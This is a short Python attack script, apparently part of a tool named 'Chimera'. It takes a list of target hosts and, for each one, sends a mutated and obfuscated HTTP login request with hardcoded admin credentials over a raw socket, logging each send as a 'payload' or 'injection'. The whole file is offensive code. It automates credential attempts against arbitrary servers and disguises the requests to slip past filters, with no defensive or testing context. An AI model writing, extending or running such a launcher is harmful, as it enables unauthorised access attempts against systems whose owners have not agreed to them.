import socket

from memory_engine import get_top_targets
from neural_mutator import mutate
from obfuscator_engine import obfuscate_http


def fire():
    targets = get_top_targets()
    if not targets:
        print("[!] No valid targets found.")
        return
    print(f"[*] Launching Chimera payloads to {len(targets)} targets.")
    for t in targets:
        ip, port = t.split(":")
        port = int(port)
        base = (
            f"POST /login HTTP/1.1\r\nHost: {ip}\r\n\r\nusername=admin&password=secret"
        )
        raw = mutate(base)
        obs = obfuscate_http(raw)
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((ip, port))
            s.sendall(obs.encode())
            s.close()
            print(f"[+] Chimera probe sent to {ip}:{port}")
        except Exception as e:
            print(f"[!] Chimera injection failed to {ip}:{port} - {e}")


if __name__ == "__main__":
    fire()
